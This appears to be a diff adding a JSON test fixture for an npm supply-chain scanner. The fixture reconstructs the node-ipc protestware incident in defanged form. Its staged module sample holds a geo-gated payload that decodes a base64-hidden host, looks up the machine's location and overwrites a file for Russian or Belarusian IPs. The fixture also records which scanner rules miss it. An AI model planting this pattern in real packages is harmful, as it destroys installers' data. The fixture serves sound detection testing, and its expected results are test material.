@@ -1,0 +1,46 @@
+{
+  "id": "npm-node-ipc-protestware-wiper",
+  "title": "Geo-gated protestware overwrites files for hosts in a targeted region",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "protestware",
+  "source": "real-sanitized",
+  "provenance": "node-ipc 10.1.1 / 10.1.2 (March 2022): a maintainer-introduced payload geolocated the host and, for IPs resolved to Russia or Belarus, overwrote files on disk with a heart emoji. Defanged: geo-IP host replaced with example.invalid, the overwrite loop is reduced to a single write so it is inert in the fixture.",
+  "intent": "Models destructive protestware injected into an existing runtime module: a geo lookup gates an fs-based file overwrite. This is a KNOWN MISS — the payload lives in a modified (not added) module and uses only network + a base64 host decode, so the deterministic rules land it at medium while the truth is a destructive wiper (high). It documents the gap that destructive fs behavior and geo-gating carry no dedicated rule and that modified-file network access is only medium. Safe: host is example.invalid, the loop writes one inert byte.",
+  "expectMinRisk": "high",
+  "expectAnyRule": [],
+  "previousPackageJson": { "name": "node-ipc", "version": "10.1.0" },
+  "stagedPackageJson": { "name": "node-ipc", "version": "10.1.1" },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 42,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"node-ipc\",\"version\":\"10.1.0\"}"
+    },
+    {
+      "path": "dao/ssl-geolocation.js",
+      "size": 60,
+      "sha256": "geo-js-prev",
+      "flags": [],
+      "textSample": "module.exports = function geo() { return null; };\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 42,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"node-ipc\",\"version\":\"10.1.1\"}"
+    },
+    {
+      "path": "dao/ssl-geolocation.js",
+      "size": 430,
+      "sha256": "geo-js-staged",
+      "flags": [],
+      "textSample": "const https = require('https');\nconst fs = require('fs');\n// Geolocate the host; for a targeted region, overwrite files on disk.\nconst host = Buffer.from('YXBpLmV4YW1wbGUuaW52YWxpZA==', 'base64').toString('utf8');\nhttps.get('https://' + host + '/ipgeo', (res) => {\n  let body = '';\n  res.on('data', (c) => (body += c));\n  res.on('end', () => {\n    if (/Russia|Belarus/.test(body)) {\n      fs.writeFileSync('README.md', '\\u2764');\n    }\n  });\n});\n"
+    }
+  ]
+}
